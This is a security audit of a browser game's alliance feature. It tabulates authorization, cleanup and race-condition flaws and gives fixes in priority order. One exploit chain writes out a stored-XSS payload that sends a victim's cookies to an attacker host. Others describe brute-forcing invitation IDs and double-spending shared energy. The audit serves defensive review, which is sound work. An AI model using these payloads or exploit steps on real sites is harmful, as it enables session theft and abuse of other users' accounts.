# ROUND 3 -- ALLIANCE SYSTEM END-TO-END CROSS-DOMAIN AUDIT

**Audit date:** 2026-03-03
**Scope:** Complete alliance lifecycle -- creation, membership, administration, diplomacy, research, donations, cleanup
**Files reviewed:** alliance.php, allianceadmin.php, validerpacte.php, don.php, guerre.php, includes/player.php (supprimerAlliance, supprimerJoueur), includes/combat.php (war loss tracking), includes/db_helpers.php (allianceResearchBonus), includes/bbcode.php (description rendering), ecriremessage.php (alliance broadcast), includes/config.php (alliance constants)
**Prior round findings cross-referenced:** SOC-R1-001 through SOC-R1-012, SOC-R2-001 through SOC-R2-032

---

## Table of Contents

1. [Authorization Matrix](#a-authorization-matrix)
2. [Data Cleanup Matrix](#b-data-cleanup-matrix)
3. [Race Condition Analysis](#c-race-condition-analysis)
4. [UX Gaps for Alliance Leaders](#d-ux-gaps-for-alliance-leaders)
5. [New Findings Summary Table](#e-new-findings-summary-table)
6. [Cross-Domain Correlation Map](#f-cross-domain-correlation-map)
7. [Recommended Fix Order](#g-recommended-fix-order)

---

## A. Authorization Matrix

### Grade Permission System

The grade system stores permissions as a dot-separated string `inviter.guerre.pacte.bannir.description` in `grades.grade`.
Values: `1` = granted, `0` = denied. Chef automatically gets all permissions.

### Action-by-Action Authorization Audit

| # | Action | File:Line | Required Role | Actual Check | GAP |
|---|--------|-----------|---------------|-------------|-----|
| 1 | **Create alliance** | alliance.php:30-65 | No alliance member | `$allianceJoueur['tag'] == -1` | OK -- checks player has no alliance |
| 2 | **Accept invitation** | alliance.php:117-134 | Invited player | `invitations.id` lookup only | **CRITICAL: No check that `invite == $_SESSION['login']`** (SOC-R2-001 UNFIXED) |
| 3 | **Decline invitation** | alliance.php:117-134 | Invited player | Same as accept | **CRITICAL: Same as above** |
| 4 | **Quit alliance** | alliance.php:69-72 | Alliance member | `$_POST['quitter']` within `$_GET['id'] == $allianceJoueur['tag']` | **HIGH: No check if player is chef** (SOC-R1-006 UNFIXED) |
| 5 | **Quit alliance -- grade cleanup** | alliance.php:71 | N/A | None | **HIGH: Grades NOT deleted on quit** (SOC-R2-002 UNFIXED) |
| 6 | **Upgrade duplicateur** | alliance.php:78-90 | Alliance member | Only checks `$_GET['id'] == $allianceJoueur['tag']` and energy | **HIGH: Any member can spend alliance energy** (SOC-R2-008 UNFIXED) |
| 7 | **Upgrade research** | alliance.php:94-113 | Alliance member | Only checks `$_GET['id'] == $allianceJoueur['tag']` and energy | **HIGH: Any member can spend alliance energy** (SOC-R2-008 UNFIXED) |
| 8 | **Delete alliance** | allianceadmin.php:44-54 | Chef only | `$gradeChef` flag | OK |
| 9 | **Change name** | allianceadmin.php:56-72 | Chef only | `$gradeChef` flag (inside `if ($gradeChef)` block) | **MEDIUM: No name format validation** (SOC-R2-004/022 UNFIXED) |
| 10 | **Change tag** | allianceadmin.php:121-137 | Chef only | `$gradeChef` flag | **HIGH: No regex validation on tag change** (SOC-R2-005 UNFIXED) |
| 11 | **Change chef** | allianceadmin.php:139-158 | Chef only | `$gradeChef` flag + verifies target in alliance | OK but see race condition C-03 |
| 12 | **Create grade** | allianceadmin.php:74-106 | Chef only | `$gradeChef` flag | **MEDIUM: Can grade any player in the game, not just alliance members** |
| 13 | **Delete grade** | allianceadmin.php:108-119 | Chef only | `$gradeChef` flag | **HIGH: Hidden field leak** (SOC-R2-007 UNFIXED) |
| 14 | **Change description** | allianceadmin.php:163-174 | Chef or grade(description) | `$description` flag | **LOW: No length limit** (SOC-R2-012 UNFIXED) |
| 15 | **Ban member** | allianceadmin.php:176-193 | Chef or grade(bannir) | `$bannir` flag, checks target in alliance | **MEDIUM: Can ban the chef** (SOC-R2-021 UNFIXED) |
| 16 | **Invite player** | allianceadmin.php:299-326 | Chef or grade(inviter) | `$inviter` flag | OK |
| 17 | **Propose pact** | allianceadmin.php:195-228 | Chef or grade(pacte) | `$pacte` flag | OK but pact form has no CSRF token in rapport body |
| 18 | **Break pact** | allianceadmin.php:230-246 | Chef or grade(pacte) | `$pacte` flag | OK |
| 19 | **Declare war** | allianceadmin.php:249-277 | Chef or grade(guerre) | `$guerre` flag | **MEDIUM: Debug echo on line 258** (SOC-R2-014 UNFIXED) |
| 20 | **End war** | allianceadmin.php:279-296 | Chef or grade(guerre) | `$guerre` flag | OK |
| 21 | **Accept pact** | validerpacte.php:2-26 | Chef of target alliance | Checks `$targetAlliance['chef'] === $_SESSION['login']` | OK (fixed in earlier audit) |
| 22 | **Donate energy** | don.php:4-53 | Alliance member | Checks `idalliance > 0` and alliance exists | OK |
| 23 | **View alliance page** | alliance.php:139-406 | Anyone (public) | No auth required | **MEDIUM: `SELECT *` exposes all columns including energieAlliance** (SOC-R2-019 UNFIXED) |
| 24 | **Alliance admin page access** | allianceadmin.php:17-24 | Chef or graded | Checks chef or grade exists | **CRITICAL: Stale grade allows ex-member access** (SOC-R2-002 UNFIXED) |
| 25 | **Alliance broadcast message** | ecriremessage.php:12-19 | Alliance member | Only checks `idalliance > 0` | **HIGH: No rate limit** (SOC-R2-011 UNFIXED) |
| 26 | **View war details** | guerre.php:15-66 | Anyone (public) | `$_GET['id']` looked up, no auth | OK (war data is intentionally public) |

### Authorization Gap Summary

| Gap Category | Count | Severity |
|-------------|-------|----------|
| Missing ownership verification | 2 | CRITICAL |
| Missing role check (research/dupli) | 2 | HIGH |
| Stale permission records | 1 | CRITICAL |
| Chef can be removed without safeguard | 2 | HIGH |
| Missing input validation | 3 | HIGH/MEDIUM |
| Information disclosure | 1 | MEDIUM |

---

## B. Data Cleanup Matrix

### Event: Player QUITS Alliance (alliance.php:69-72)

| Table | Expected Cleanup | Actual Cleanup | Status |
|-------|-----------------|----------------|--------|
| `autre` | Set `idalliance=0` | `UPDATE autre SET idalliance=0 WHERE login=?` | OK |
| `grades` | Delete player's grade records | **NOT DONE** | **MISSING** |
| `invitations` | Delete pending invitations sent to player | NOT DONE (but harmless -- player can rejoin) | LOW |
| `alliances.chef` | Verify quitter is not chef | **NOT CHECKED** | **MISSING -- can orphan alliance** |
| `autre.energieDonnee` | Keep or reset donation tracking | Not touched | OK (kept for history) |

### Event: Player BANNED from Alliance (allianceadmin.php:176-193)

| Table | Expected Cleanup | Actual Cleanup | Status |
|-------|-----------------|----------------|--------|
| `autre` | Set `idalliance=0` | `UPDATE autre SET idalliance=0 WHERE login=?` | OK |
| `grades` | Delete player's grade records | `DELETE FROM grades WHERE idalliance=? AND login=?` | OK |
| `invitations` | N/A (player is already a member) | N/A | OK |
| `alliances.chef` | Verify target is not chef | **NOT CHECKED** | **MISSING -- can orphan alliance** |
| `autre.energieDonnee` | Keep or reset donation tracking | Not touched | OK |

### Event: Alliance DISBANDED (supprimerAlliance in player.php:739-750)

| Table | Expected Cleanup | Actual Cleanup | Status |
|-------|-----------------|----------------|--------|
| `alliances` | Delete alliance row | `DELETE FROM alliances WHERE id=?` | OK |
| `autre` | Reset all members' `idalliance` to 0 | `UPDATE autre SET idalliance=0 WHERE idalliance=?` | OK |
| `autre.energieDonnee` | Reset donation counters | `UPDATE autre SET energieDonnee=0 WHERE idalliance=?` | OK |
| `grades` | Delete all alliance grades | `DELETE FROM grades WHERE idalliance=?` | OK |
| `invitations` | Delete all pending invitations | `DELETE FROM invitations WHERE idalliance=?` | OK |
| `declarations` | Delete all wars/pacts | `DELETE FROM declarations WHERE (alliance1=? OR alliance2=?)` | OK |
| `rapports` | Clean up pact-accept forms in reports | **NOT DONE** | **MEDIUM: Stale pact-accept forms remain in rapports** |
| `messages` | Clean alliance-tagged messages | NOT DONE (acceptable -- messages are player-owned) | OK |

### Event: Player DELETED (supprimerJoueur in player.php:752-778)

| Table | Expected Cleanup | Actual Cleanup | Status |
|-------|-----------------|----------------|--------|
| `autre` | Delete row | `DELETE FROM autre WHERE login=?` | OK |
| `membre` | Delete row | `DELETE FROM membre WHERE login=?` | OK |
| `ressources` | Delete row | `DELETE FROM ressources WHERE login=?` | OK |
| `molecules` | Delete rows | `DELETE FROM molecules WHERE proprietaire=?` | OK |
| `constructions` | Delete row | `DELETE FROM constructions WHERE login=?` | OK |
| `invitations` | Delete invited-to entries | `DELETE FROM invitations WHERE invite=?` | OK |
| `messages` | Delete sent/received | `DELETE FROM messages WHERE destinataire=? OR expeditaire=?` | OK |
| `rapports` | Delete reports | `DELETE FROM rapports WHERE destinataire=?` | OK |
| `grades` | Delete grade records | `DELETE FROM grades WHERE login=?` | OK |
| `actionsattaques` | Delete attack records | `DELETE FROM actionsattaques WHERE attaquant=? OR defenseur=?` | OK |
| `actionsformation` | Delete formation records | `DELETE FROM actionsformation WHERE login=?` | OK |
| `actionsenvoi` | Delete send actions | `DELETE FROM actionsenvoi WHERE envoyeur=? OR receveur=?` | OK |
| `statutforum` | Delete forum status | `DELETE FROM statutforum WHERE login=?` | OK |
| `vacances` | Delete vacation records | `DELETE FROM vacances WHERE idJoueur IN (...)` | OK |
| `alliances.chef` | If player is chef, handle alliance | **NOT DONE** | **HIGH: Orphaned alliance until someone views it** |
| `declarations` | If player is chef, pending pacts sent by alliance | NOT DONE directly | Handled lazily by alliance.php:148-157 |
| `statistiques` | Decrement inscrits | `UPDATE statistiques SET inscrits=?` | OK |

### Event: Chef TRANSFERS Leadership (allianceadmin.php:139-158)

| Table | Expected Cleanup | Actual Cleanup | Status |
|-------|-----------------|----------------|--------|
| `alliances.chef` | Update chef field | `UPDATE alliances SET chef=? WHERE id=?` | OK |
| `grades` | Optionally remove old chef's grade | NOT DONE | LOW (chef never has a grade row -- chef status is implicit) |
| Redirect | Redirect old chef away from admin | JavaScript redirect to allianceprive.php | OK |

### Cleanup Gap Summary

| Gap | Severity | Impact |
|-----|----------|--------|
| Grades not deleted on quit | HIGH | Stale permissions -- ex-member can access allianceadmin.php |
| Chef can quit without transfer | HIGH | Alliance orphaned, eventually deleted when viewed |
| Chef can be banned | MEDIUM | Alliance orphaned, eventually deleted |
| Deleted player who was chef | HIGH | Orphaned alliance in limbo until viewed |
| Stale pact-accept forms in rapports | MEDIUM | After alliance deletion, old pact-accept forms reference deleted alliances |

---

## C. Race Condition Analysis

### C-01: Duplicateur/Research Upgrade -- Double-Spend (UNFIXED)

**File:** alliance.php:78-113
**Pattern:** Read energy -> check sufficient -> decrement energy
**Problem:** No transaction, no `FOR UPDATE`, no CAS guard.

```
Thread A: SELECT energieAlliance FROM alliances WHERE id=5  --> 1000
Thread B: SELECT energieAlliance FROM alliances WHERE id=5  --> 1000
Thread A: UPDATE alliances SET energieAlliance=500 WHERE id=5  (cost 500)
Thread B: UPDATE alliances SET energieAlliance=500 WHERE id=5  (cost 500)
```

Both threads succeed, spending 500 each but only deducting 500 total from the original 1000. Alliance gains two upgrades for the price of one.

**Severity:** HIGH
**Affected actions:** `augmenterDuplicateur`, `upgradeResearch` (both use the same pattern)
**Fix:** Wrap in `withTransaction()` with `SELECT ... FOR UPDATE`, or use atomic `UPDATE alliances SET energieAlliance = energieAlliance - ? WHERE id=? AND energieAlliance >= ?` and check affected rows.

### C-02: Alliance Creation -- Duplicate Tag/Name Race

**File:** alliance.php:40-49
**Pattern:** SELECT to check uniqueness -> INSERT

```
Thread A: SELECT nom FROM alliances WHERE tag='FOO' --> 0 rows
Thread B: SELECT nom FROM alliances WHERE tag='FOO' --> 0 rows
Thread A: INSERT INTO alliances ... tag='FOO'
Thread B: INSERT INTO alliances ... tag='FOO'
```

Both succeed, creating two alliances with the same tag. The `alliances.tag` column has no UNIQUE constraint in the schema.

**Severity:** MEDIUM (requires near-simultaneous registration)
**Fix:** Add `UNIQUE` index on `alliances.tag` and `alliances.nom`. Handle duplicate key error gracefully.

### C-03: Chef Transfer -- Concurrent Operations

**File:** allianceadmin.php:139-158
**Pattern:** Chef transfers leadership while simultaneously another graded member is performing an admin action.

The grade-check at allianceadmin.php:10-12 happens before the chef-transfer at line 145. If two requests arrive concurrently:

```
Request A (chef): Starts processing "change chef to PlayerX"
Request B (graded): Starts processing "declare war" (checked against old chef's alliance)
Request A: Updates alliances.chef to PlayerX
Request B: Still using old $chef data, declares war on behalf of alliance
```

**Severity:** LOW (narrow window, requires exact timing)
**Impact:** War declared by player who is no longer authorized.

### C-04: Ban + Quit Race

**File:** alliance.php:69-72, allianceadmin.php:176-193

If a player submits "quit" at the same time an admin submits "ban" for the same player:

```
Thread A (player): UPDATE autre SET idalliance=0 WHERE login='X'
Thread B (admin):  SELECT count(*) FROM autre WHERE idalliance=5 AND login='X' --> 1 (before A committed)
Thread B (admin):  UPDATE autre SET idalliance=0 WHERE login='X'
Thread B (admin):  DELETE FROM grades WHERE idalliance=5 AND login='X'
```

Both succeed. This is mostly harmless (double-setting idalliance=0), but the grade cleanup only happens in the ban path, not the quit path. If the quit commits first and the ban check sees the old value, grades get cleaned. If quit commits after the ban check but before ban update, the ban is a no-op on `autre` but grades are still cleaned.

**Severity:** LOW (harmless outcome)

### C-05: Invitation Accept -- Concurrent Acceptance

**File:** alliance.php:117-134
**Pattern:** No ownership check means two different players could accept the same invitation ID:

```
Thread A (Player X): POST idinvitation=42, actioninvitation=Accepter
Thread B (Player Y): POST idinvitation=42, actioninvitation=Accepter
Thread A: UPDATE autre SET idalliance=5 WHERE login='X'  (X joins alliance)
Thread B: UPDATE autre SET idalliance=5 WHERE login='Y'  (Y joins alliance too)
Thread A: DELETE FROM invitations WHERE id=42
Thread B: DELETE FROM invitations WHERE id=42 (already gone, 0 rows affected)
```

Both players join the alliance. This is the SOC-R2-001 invitation theft compounded by a race -- even if one player was the intended recipient, both get in.

**Severity:** CRITICAL (extends SOC-R2-001)
**Fix:** Add `AND invite=?` to the SELECT and do the accept + delete in a transaction.

### C-06: Energy Donation -- Already Fixed

**File:** don.php:17-31
The donation flow correctly uses `withTransaction()` with `FOR UPDATE` locks.
**Status:** No race condition.

### C-07: War Loss Tracking -- Non-Atomic Update

**File:** includes/combat.php:624-633
**Pattern:** Read current `pertes1`/`pertes2` -> compute new values -> write back

```php
$guerre = mysqli_fetch_array($exGuerre);  // reads current values
// ...
dbExecute($base, 'UPDATE declarations SET pertes1=?, pertes2=? WHERE id=?',
    'ddi', ($guerre['pertes1'] + $pertesAttaquant), ...);
```

If two combats resolve simultaneously for the same war, the second overwrites the first's loss count:

```
Thread A: Read pertes1=100, adds 50, writes pertes1=150
Thread B: Read pertes1=100, adds 30, writes pertes1=130  (Thread A's 50 lost)
```

**Severity:** MEDIUM (war stats are cosmetic but tracked for rankings)
**Fix:** Use atomic `UPDATE declarations SET pertes1 = pertes1 + ?, pertes2 = pertes2 + ? WHERE id=?`

### Race Condition Summary

| ID | Location | Pattern | Severity | Fix Complexity |
|----|----------|---------|----------|----------------|
| C-01 | alliance.php:78-113 | TOCTOU on energy spend | HIGH | Low (add transaction) |
| C-02 | alliance.php:40-49 | Duplicate tag/name | MEDIUM | Low (add UNIQUE index) |
| C-03 | allianceadmin.php:139 | Stale auth during transfer | LOW | Medium |
| C-04 | alliance.php:69 / allianceadmin.php:183 | Double quit/ban | LOW | N/A |
| C-05 | alliance.php:117-134 | Invitation double-accept | CRITICAL | Low (add ownership check) |
| C-06 | don.php:17-31 | Energy donation | N/A | Already fixed |
| C-07 | combat.php:624-633 | War loss overwrite | MEDIUM | Low (atomic update) |

---

## D. UX Gaps for Alliance Leaders

### D-01: No Confirmation on Alliance Quit (STILL UNFIXED)

**File:** alliance.php:246-247
**Status:** Previously flagged in round 1 (QOL/UX) and still not addressed.

The "Quitter l'equipe" button is a direct form submit with no JavaScript confirmation dialog and no two-step flow. On mobile (Framework7 Material UI), accidental taps can remove a player from their alliance instantly and irrevocably. There is no "undo" mechanism.

**Impact:** HIGH for user experience. Players can lose alliance membership, access to alliance energy/research bonuses, and their donation history in a single accidental tap.

**Fix:** Add `onclick="return confirm('Voulez-vous vraiment quitter l\'equipe?')"` to the submit button, or implement a two-step confirmation modal.

### D-02: No Alliance Activity Log

There is no log of who performed which alliance admin actions. The `logInfo()` call exists only for alliance creation (alliance.php:51) and alliance deletion (allianceadmin.php:46). There is no logging for:

- Who upgraded duplicateur/research (and at what cost)
- Who invited/banned which player
- Who declared/ended wars
- Who proposed/broke pacts
- Who changed the alliance name/tag/description

**Impact:** MEDIUM. Alliance leaders cannot audit who spent alliance energy or who made diplomatic decisions. This is especially problematic when multiple players have grade permissions.

**Fix:** Add `logInfo('ALLIANCE', ...)` calls to each admin action with the actor, action, and affected entity.

### D-03: No Alliance Event Notifications for Members

When the chef or a graded member takes an action (declares war, proposes pact, upgrades research), the other alliance members are not notified. The only notification system is the rapport sent to the _opposing_ alliance's chef for war/pact actions. Alliance members must visit the alliance page to discover changes.

**Impact:** MEDIUM. Members may be unaware of wars declared on their behalf, or that alliance energy was spent on research.

### D-04: No Donation Goal / Minimum Donation Amount

**File:** don.php
Any amount >= 1 energy can be donated. There is no:
- Minimum donation threshold (1 energy donations are possible but meaningless)
- Donation goal setting by the chef (e.g., "we need 500 energy for next duplicateur level")
- Donation leaderboard visible only to alliance members (the donation percentage is visible to all)

**Impact:** LOW. Quality-of-life improvement for coordination.

### D-05: No Grade Permission Display for Graded Players

When a graded player accesses allianceadmin.php, they see the admin interface but cannot see what permissions they have. The grade string `1.0.1.0.1` is parsed server-side but never displayed to the player. A graded member with only "invite" permission will see forms for all actions but get silently ignored when submitting unauthorized ones.

Wait -- actually the UI hides sections based on permission flags (`if ($inviter)`, `if ($bannir)`, etc.), so graded players only see forms for their authorized actions. However, there is no explicit "Your permissions: Invite, Pact" summary shown.

**Impact:** LOW. Would improve clarity for graded members.

### D-06: No Member Application / Join Request System

The only way to join an alliance is through an invitation from the alliance admin. There is no way for a player to request to join an alliance. Players must contact the alliance chef out-of-band (forum, message) to request an invitation.

**Impact:** LOW. Social feature gap.

### D-07: No Alliance Message Board / Internal Communication

Alliance members can send broadcast messages via `ecriremessage.php?destinataire=[alliance]`, but there is no persistent alliance-internal message board, pinned announcements, or alliance chat. Each broadcast is a separate private message to each member.

**Impact:** LOW. Quality-of-life improvement.

### D-08: Grade System Only Allows One Grade Per Player

The grade check uses `SELECT count(*) FROM grades WHERE login=? AND idalliance=?` to prevent duplicate grades. A player can only have one grade per alliance. This means a chef cannot create multiple role names for the same player (e.g., "Diplomate" with pact rights AND "Recruteur" with invite rights). Since all permissions are stored in a single grade row, this is actually fine architecturally, but the UI presents "grade name" as if it were a title, not a permission bundle.

**Impact:** INFORMATIONAL. Current design works but naming is confusing.

### D-09: No Alliance Rank Brackets Beyond Top 3

The victory points for alliances only reward ranks 1-9 (15, 10, 7, then 10-rank for 4-9). There is no display of "your alliance's current rank" in the alliance admin page -- leaders must check the public ranking page.

**Impact:** LOW.

### D-10: Alliance Tag Stored in Invitations Is Stale

**File:** allianceadmin.php:310

```php
dbExecute($base, 'INSERT INTO invitations VALUES (default, ?, ?, ?)',
    'iss', $idalliance['idalliance'], $chef['tag'], $_POST['inviterpersonne']);
```

The invitation stores the alliance's tag at the time of invitation. If the chef later changes the tag (allianceadmin.php:128), existing invitations still show the old tag. When the invited player views their invitations (alliance.php:432), they see the old tag name.

**Impact:** LOW. Cosmetic confusion but functionally correct (join uses `idalliance` not `tag`).

### UX Gap Summary

| ID | Description | Priority | Effort |
|----|-------------|----------|--------|
| D-01 | No quit confirmation | HIGH | Trivial (1 line JS) |
| D-02 | No admin action log | MEDIUM | Low (add logInfo calls) |
| D-03 | No member notifications | MEDIUM | Medium |
| D-04 | No donation goals | LOW | Medium |
| D-05 | No permission summary display | LOW | Trivial |
| D-06 | No join request system | LOW | Medium |
| D-07 | No alliance message board | LOW | High |
| D-08 | Single grade per player | INFORMATIONAL | N/A |
| D-09 | No rank display in admin | LOW | Trivial |
| D-10 | Stale tag in invitations | LOW | Trivial |

---

## E. New Findings Summary Table

These are findings that either were not identified in rounds 1-2, or were identified but remain **confirmed unfixed** in the current codebase as of this audit date.

### New Findings (Not in Rounds 1-2)

| ID | Severity | File:Line | Title | Category |
|----|----------|-----------|-------|----------|
| SOC-R3-001 | HIGH | alliance.php:78-90 | Duplicateur upgrade TOCTOU race (double-spend) | Race Condition |
| SOC-R3-002 | HIGH | alliance.php:94-113 | Research upgrade TOCTOU race (double-spend) | Race Condition |
| SOC-R3-003 | MEDIUM | combat.php:624-633 | War loss tracking non-atomic read-modify-write | Race Condition |
| SOC-R3-004 | MEDIUM | alliance.php:40-49 | Alliance creation tag/name uniqueness race | Race Condition |
| SOC-R3-005 | MEDIUM | allianceadmin.php:74-106 | Grade can be assigned to non-alliance-member | Authorization |
| SOC-R3-006 | HIGH | player.php:752-778 | supprimerJoueur does not handle chef status | Cleanup |
| SOC-R3-007 | MEDIUM | player.php:739-750 | supprimerAlliance does not clean stale rapport forms | Cleanup |
| SOC-R3-008 | MEDIUM | allianceadmin.php:310 | Invitation tag is snapshot, becomes stale on tag change | Data Integrity |
| SOC-R3-009 | LOW | allianceadmin.php:426-433 | Grade list XSS: login and nom not escaped in table output | Security |
| SOC-R3-010 | MEDIUM | allianceadmin.php:195-220 | Pact proposal rapport contains raw HTML form without CSRF | Security |

### Confirmed Unfixed from Rounds 1-2

| Original ID | Severity | Current Status | Description |
|-------------|----------|----------------|-------------|
| SOC-R2-001 | CRITICAL | **UNFIXED** | Invitation acceptance has no `invite = $_SESSION['login']` check. Any logged-in player can accept any invitation ID. |
| SOC-R2-002 | CRITICAL | **UNFIXED** | Grades not cleaned on quit. Ex-member with stale grade can access allianceadmin.php. |
| SOC-R2-005 | HIGH | **UNFIXED** | Tag change has no regex validation (creation validates `[a-zA-Z0-9_]{3,16}`, change does not). |
| SOC-R2-008 | HIGH | **UNFIXED** | Any alliance member can upgrade duplicateur/research -- no chef/grade check. |
| SOC-R2-021 | MEDIUM | **UNFIXED** | Chef can be banned (by graded member or self), orphaning alliance. |
| SOC-R2-014 | MEDIUM | **UNFIXED** | `echo $nbDeclarations['nbDeclarations'];` on allianceadmin.php:258 leaks debug output. |
| SOC-R2-007 | HIGH | **UNFIXED** | Grade deletion uses single hidden field; last grade in DOM wins. |
| SOC-R2-004 | HIGH | **UNFIXED** | Alliance name change has no format validation. |
| SOC-R2-011 | HIGH | **UNFIXED** | Alliance broadcast message has no rate limit. |
| SOC-R2-022 | MEDIUM | **UNFIXED** | Alliance creation does not validate name format (only tag is validated). |
| SOC-R1-006 | HIGH | **UNFIXED** | Chef can quit alliance without leadership transfer, orphaning it. |

---

## F. Cross-Domain Correlation Map

This section traces how individual findings combine into exploit chains that cross multiple subsystems.

### Chain 1: Invitation Theft -> Hostile Takeover

```
SOC-R2-001 (invitation theft)
  + SOC-R2-008 (any member spends energy)
  + SOC-R3-001 (double-spend race)
  = Attacker joins target alliance via stolen invitation,
    then drains all alliance energy via rapid duplicateur upgrades
```

**Steps:**
1. Attacker discovers invitation IDs (sequential integers, brute-forceable)
2. Attacker POSTs `actioninvitation=Accepter&idinvitation=N` to join target alliance
3. Attacker rapidly submits `augmenterDuplicateur` upgrades, draining alliance energy
4. Using race condition C-01, attacker can double-spend to drain energy even faster

### Chain 2: Stale Grade -> Alliance Destruction

```
SOC-R2-002 (grades not cleaned on quit)
  + SOC-R2-021 (chef can be banned)
  = Ex-member with ban grade can return and ban the chef,
    causing lazy alliance deletion on next page view
```

**Steps:**
1. Player X has a grade with `bannir=1` in Alliance A
2. Player X quits alliance (alliance.php:71 -- `idalliance=0` but grade row persists)
3. Player X joins Alliance B (or creates a new one)
4. Player X navigates to allianceadmin.php -- the code at line 6-8 reads X's current `idalliance` (now Alliance B), but the grade check at line 10 finds X's OLD grade for Alliance A
5. Wait -- actually, line 8 reads `$chef` from `alliances WHERE id = X's current idalliance`, and line 10 checks `grades WHERE login=X AND idalliance=$chef['id']`. So if X is now in Alliance B, `$chef['id']` = Alliance B's ID, and the grade lookup would find nothing (grade was for Alliance A).

**Revised analysis:** The stale grade exploit requires that the grade's `idalliance` matches the player's current alliance. Since `idalliance` in `grades` stores the alliance ID and the player's `autre.idalliance` changes when they quit/join, the grade would NOT match a different alliance. However, if the player rejoins the SAME alliance (via new invitation), the old grade record matches again and the player has unauthorized permissions without the chef re-granting them.

**Revised chain:**
1. Player X has grade(bannir) in Alliance A
2. Player X quits Alliance A (grade persists, `autre.idalliance=0`)
3. Player X receives new invitation to Alliance A and accepts
4. Player X now has `autre.idalliance = Alliance A's id` and `grades.idalliance = Alliance A's id`
5. Player X accesses allianceadmin.php with full ban permissions restored WITHOUT chef approval
6. Player X bans the chef, orphaning the alliance

### Chain 3: Tag Injection -> Stored XSS in Rapports

```
SOC-R2-005 (no tag validation on change)
  + SOC-R2-015 (unescaped tag in rapport HTML)
  + SOC-R2-006 (pact form embedded in rapport)
  = Chef changes tag to '<img src=x onerror=...>',
    then declares war or proposes pact,
    injecting XSS into opponent chef's rapport page
```

**Steps:**
1. Chef changes alliance tag to `<script>document.location='http://evil.com/steal?c='+document.cookie</script>` (no validation on change)
2. Chef declares war on Alliance B (allianceadmin.php:267-268)
3. Rapport inserted for Alliance B's chef with: `L'alliance <a href="alliance.php?id=<script>...">...`
4. Alliance B's chef views rapports page, XSS executes

**Note:** The rapport body uses `strip_tags` with an allowlist that may include `<a>` and other tags (SOC-R2-025), so the injection point is in the rapport content which is stored as raw HTML.

### Chain 4: Grade-Any-Player -> Cross-Alliance Intelligence

```
SOC-R3-005 (grade can target non-member)
  + grade table has no foreign key to autre.idalliance
  = Chef assigns grade to a spy player in another alliance,
    spy's grade record exists but cannot access admin (auth check prevents)
```

This is actually mitigated by the auth check at allianceadmin.php:17 which verifies the player's current `idalliance` matches the alliance they're trying to admin. However, the grade record persists and consumes a slot (the chef cannot know the player doesn't actually have the grade applied). It also means the `grades` table can accumulate garbage entries for non-members.

**Severity:** MEDIUM (data pollution, not exploitable for access)

### Chain 5: Donation Drain -> Competitive Sabotage

```
SOC-R2-001 (invitation theft)
  + don.php (any member can donate)
  + SOC-R2-008 (any member upgrades research)
  = Attacker joins alliance, wastes energy on useless research,
    or donates their own 0-value amounts to inflate donation tracking
```

This is less a "chain" and more a consequence of the invitation theft enabling all subsequent member actions.

---

## G. Recommended Fix Order

### Priority 1: CRITICAL (Must fix before next season)

| # | Finding | Fix | Effort |
|---|---------|-----|--------|
| 1 | SOC-R2-001: Invitation theft | Add `WHERE invite=? ($_SESSION['login'])` to invitation lookup at alliance.php:120 | 5 min |
| 2 | SOC-R2-002: Stale grades on quit | Add `DELETE FROM grades WHERE login=? AND idalliance=?` at alliance.php:71 | 5 min |
| 3 | SOC-R1-006: Chef can quit | Add `if ($allianceJoueur['chef'] === $_SESSION['login']) { $erreur = "...transfer first"; }` check before quit action | 5 min |

### Priority 2: HIGH (Fix this week)

| # | Finding | Fix | Effort |
|---|---------|-----|--------|
| 4 | SOC-R2-008: Research/dupli no auth | Add chef-or-grade check (require a new "research" permission or chef-only) | 15 min |
| 5 | SOC-R3-001/002: Research double-spend | Wrap in `withTransaction` with `FOR UPDATE`, or use atomic `UPDATE ... WHERE energieAlliance >= ?` | 15 min |
| 6 | SOC-R2-005: Tag change no validation | Add `preg_match("#^[a-zA-Z0-9_]{3,16}$#", ...)` (same as creation) | 5 min |
| 7 | SOC-R2-021: Chef can be banned | Add `if ($_POST['bannirpersonne'] === $chef['chef']) { $erreur = "..."; }` | 5 min |
| 8 | SOC-R2-007: Grade deletion hidden field | Use unique hidden field name per grade row or submit grade login in the form | 15 min |
| 9 | SOC-R3-006: supprimerJoueur no chef check | Before deletion, check if player is chef and either transfer or delete alliance | 10 min |
| 10 | SOC-R2-004: Name change no validation | Add regex or length/charset validation | 5 min |

### Priority 3: MEDIUM (Fix this month)

| # | Finding | Fix | Effort |
|---|---------|-----|--------|
| 11 | SOC-R2-014: Debug echo | Remove `echo $nbDeclarations['nbDeclarations'];` at allianceadmin.php:258 | 1 min |
| 12 | SOC-R3-003: War loss non-atomic | Change to `SET pertes1 = pertes1 + ?` | 5 min |
| 13 | SOC-R3-004: Creation uniqueness race | Add UNIQUE indexes on `alliances.tag` and `alliances.nom` | 5 min |
| 14 | SOC-R3-005: Grade assigned to non-member | Add `WHERE login IN (SELECT login FROM autre WHERE idalliance=?)` check | 5 min |
| 15 | SOC-R3-009: Grade list XSS | Apply `htmlspecialchars()` to `$listeGrades['login']` and `$listeGrades['nom']` | 5 min |
| 16 | SOC-R3-010: Pact rapport missing CSRF | Include CSRF token in embedded form, or change pact acceptance to a link-based flow | 15 min |
| 17 | D-01: No quit confirmation | Add `onclick="return confirm(...)"` | 2 min |
| 18 | SOC-R2-011: Alliance broadcast no rate limit | Apply existing rate limiter to broadcast action | 10 min |

### Priority 4: LOW (Backlog)

| # | Finding | Fix | Effort |
|---|---------|-----|--------|
| 19 | D-02: No admin action log | Add logInfo calls to each admin action | 30 min |
| 20 | D-03: No member notifications | Add rapport on war/pact/research for all members | 1 hr |
| 21 | D-10: Stale tag in invitations | Update invitation tags when alliance tag changes, or lookup tag at display time | 10 min |
| 22 | SOC-R3-007: Stale pact forms in rapports | Clean rapports or mark them invalid on alliance deletion | 15 min |
| 23 | SOC-R2-022: Alliance name no format check | Add charset/length validation on creation | 5 min |

---

## Appendix: Complete Alliance System Data Flow Diagram

```
                                    ALLIANCE LIFECYCLE

  [Create Alliance]                 [Receive Invitation]
  alliance.php:30-65                alliance.php:117-134
  Creates: alliances row            Updates: autre.idalliance
  Updates: autre.idalliance         Deletes: invitations row
  TAG regex validated               NO ownership check (!)
  Name NOT validated (!)
         |                                    |
         v                                    v
  [Alliance Member]  <---- [Invitation] ---  [Non-Member]
         |                 allianceadmin.php:299-326
         |                 invite permission required
         |
         +---> [Donate Energy]   don.php        (transactional, safe)
         |     Updates: ressources, autre.energieDonnee, alliances.energieAlliance
         |
         +---> [Upgrade Duplicateur] alliance.php:78-90  (NO auth check!)
